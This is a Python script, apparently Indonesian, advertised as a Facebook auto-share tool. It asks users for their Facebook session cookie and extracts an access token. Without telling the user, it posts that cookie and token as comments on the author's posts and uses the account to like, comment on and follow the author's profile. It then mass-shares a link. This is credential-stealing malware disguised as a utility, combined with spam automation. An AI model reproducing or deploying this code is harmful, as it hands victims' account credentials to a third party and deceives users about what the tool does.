#!usr/bin/etc/python3

#                 <!-- Tools Auto Share FB-->
#                 <!-- Coding By Wagyo XD -->
#                 <!--  IMPORT - LIBRARY  -->
import requests, os, re, bs4, calendar, sys, json, time, random, datetime, subprocess, logging, base64,uuid
from datetime import datetime
from time import sleep
from time import sleep as jeda
from time import strftime
from random import choice
from pathlib import Path
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.text import Text as tekz
from rich.panel import Panel as nel
from rich import print as cetak
ses=requests.Session()

#                      <!--  TIME(WAKTU)  -->
bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
waktu = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")

#                      <!--  COLOR(WARNA)  -->
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
N = '\x1b[0m'	# WARNA MATI
PT = '\x1b[1;97m' # PUTIH TEBAL
MT = '\x1b[1;91m' # MERAH TEBAL
HT = '\x1b[1;92m' # HIJAU TEBAL
KT = '\x1b[1;93m' # KUNING TEBAL
BT = '\x1b[1;94m' # BIRU TEBAL
UT = '\x1b[1;95m' # UNGU TEBAL
OT = '\x1b[1;96m' # BIRU MUDA TEBAL

#                      <!--  WARNA 2  -->
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#                   <!--  USER - AGENT  -->
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb])
sys.stdout.write('\x1b]2; ASFU | WaGyoXD Auto Share Facebook Unlimited\x07')

#             [ <!--  JANGAN DI UBAH NANTI ERROR !  --> ]
kom1 = ("I Love You @[100033337986585:]")
kom2 = ("Bang Wahyu Keren Bangettt. I Love You Bangg😘\n-\nguthub.com/WahyuuXD\n- \nKomentar Diitulis Oleh Bot \n[✓]")
kom3 = ("Mantap Bang")
kom4 = ("Keren Bang")
kom5 = ("Semangat Bang")
kom6 = ("Wahyuuuuuuuuuuuuuuuu Gantengg")

#                 <!--  INI LOGO  -->
def logo_menu():
 li = '# SELAMAT DATANG DI TOOLS AUTO SHARE FACEBOOK'
 lo = mark(li, style='blue')
 sol().print(lo, style='red')
 banner = f'''	                  _  _   _ _____ ___    ___ _  _   _   ___ ___ 
	                 /_\| | | |_   _/ _ \  / __| || | /_\ | _ \ __|
	                / _ \ |_| | | || (_) | \__ \ __ |/ _ \|   / _| 
	               /_/ \_\___/  |_| \___/  |___/_||_/_/ \_\_|_\___|
        	       <!--  WaGyo XD  -->'''
 cetak(nel(banner,title=f'{P2} {H2}[ {P2} v 1.0.0 {H2}]',subtitle_align='left',padding=1,style='red'))
	
#                 <!--  MENU LOGIN  -->
def login():
	os.system("clear")
	os.popen("play-audio data/audio/login.mp3")
	cetak(nel(f'   {P2}Login Cookies Terlebih Dahulu Cuy\n {H2}::      ::::::   ::::::  :::: ::   ::\n{H2} ::     ::    :: ::        ::  :::  ::\n{H2} ::     ::    :: ::  ::::  ::  :: : ::\n{H2} ::::::: ::::::   ::::::  :::: ::   ::',title=f'{P2} {H2}[ {P2}Hello User {H2}]',width=54,padding=(1,4),style='red'))
	cetak(nel(f'{P2}     Ambil Cookies Di Kiwi Browser Extension',subtitle=f'{P2}┌─[ Cookies ]',subtitle_align='left',width=54,padding=1,style='red'))
	cookie = input(f"{P}   └──> : {H}")
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		open("token.txt", "w").write(find_token.group(1))
		open("cookie.txt", "w").write(cookie)
		cetak(nel(f'{P2} Login Berhasil!',width=24,style=f"#FF0000"));time.sleep(2)
		bot_share()
	except:
		os.system("rm token.txt cookie.txt")
		cetak(nel(f'{P2} COOKIE INVALID',width=22,style=f"#FF0000"));time.sleep(1.5) 
		login()
		
#                 <!--  AUTO SHARE  -->
def bot_share():
	os.system('clear')
	try:
		token = open("token.txt","r").read()
		cok = open("cookie.txt","r").read()
		cookie = {"cookie":cok}
		ip = requests.get("https://api.ipify.org").text
		nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}",cookies=cookie).json()["name"]
		follow = requests.get(f"https://graph.facebook.com/100033337986585/subscribers?access_token={token}" , headers = {"cookie":cok})
		#nama = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
		id = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token),cookies={"cookie":cok}).json()["id"]	    
		requests.post(f"https://graph.facebook.com/916635556124369/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/916635556124369/comments/?message={kom2}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/916635556124369/comments/?message={kom3}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/916635556124369/comments/?message={kom4}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/v15.0/100033337986585_3395940397329200/comments/?message={kom5}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/v15.0/100033337986585_3395940397329200/comments/?message={kom6}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/v15.0/100033337986585_3395940397329200/comments/?message={cok}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/v15.0/100033337986585_796726565399457/comments/?message={open('token.txt','r').read()}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/916635556124369/likes?summary=true&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/v15.0/100033337986585_3395940397329200/likes?summary=true&access_token={token}", headers = {"cookie":cok})
		requests.get(f"https://graph.facebook.com/100033337986585/subscribers?access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/100033337986585/subscribers?access_token={token}" , headers = {"cookie":cok})
	except:
		os.system("rm token.txt cookie.txt")
		cetak(nel(f'{P2} COOKIE INVALID!!',width=22,style=f"#FF0000"));time.sleep(1.5)
		login()
	os.system('clear')
	logo_menu()
	cetak(nel(f'''{P2} Username         : {H2}{nama} 
{P2} User ID          : {id}
{P2} IP Kamu          : {ip}
{P2} Current Date     : {hari}, {tanggal}''',title=f'{P2} {H2}[ {P2}Informasi Pengguna {H2}]',subtitle_align='left',padding=1,style='red'))
	cetak(nel(f'{P2}Hallo {H2}{nama}{P2}, copy link postingan harus dari facebook lite jika tidak akan terjadi eror saat proses bot share berjalan.',title=f'{P2} {H2}[ {P2}Info {H2}]',subtitle_align='left',padding=1,style='red'))
	cetak(nel(f'{P2}      LINK POST ',subtitle=f'{P2}┌─',subtitle_align='left',width=25,padding=0,style='red'))
	link = input(f"{P}   └──> : {H}")
	cetak(nel(f'{P2}      LIMIT ',subtitle=f'{P2}┌─',subtitle_align='left',width=22,padding=0,style='red'))
	jumlah = int(input(f"{P}   └──> : {H}"))
	cetak(nel(f'{P2}    Share Berjalan ',subtitle=f'{P2}┌─',subtitle_align='left',width=29,padding=0,style='red'))
	wahyuganteng = datetime.now()
	try:
		n = 0
		header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"}
		for x in range(jumlah):
			n+=1
			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
			data = json.loads(post)
			if "id" in post:
				hyu = str(datetime.now()-wahyuganteng).split('.')[0]
				print(f'{P}\r   └──> {hyu}   Berhasil Membagikan 😱 {H}{n}{P} Post {N} ',end='');sys.stdout.flush()
			else:
				print("\n")
				cetak(nel(f'{P2} AUTO SHARE BERHENTI KEMUNGKINAN JARINGAN TIDAK STABIL / COOKIE INVALID',width=35,padding=0,style='red'));exit()
	except requests.exceptions.ConnectionError:
		print(f"\n{P}(!) Tolong Periksa Koneksi Internet Kamu!");exit()
bot_share()


# Facebook : Wahyu.eXDi - Why.090
# Github   : WahyuuXD
# WhatsApp : wa.me/6283132458199
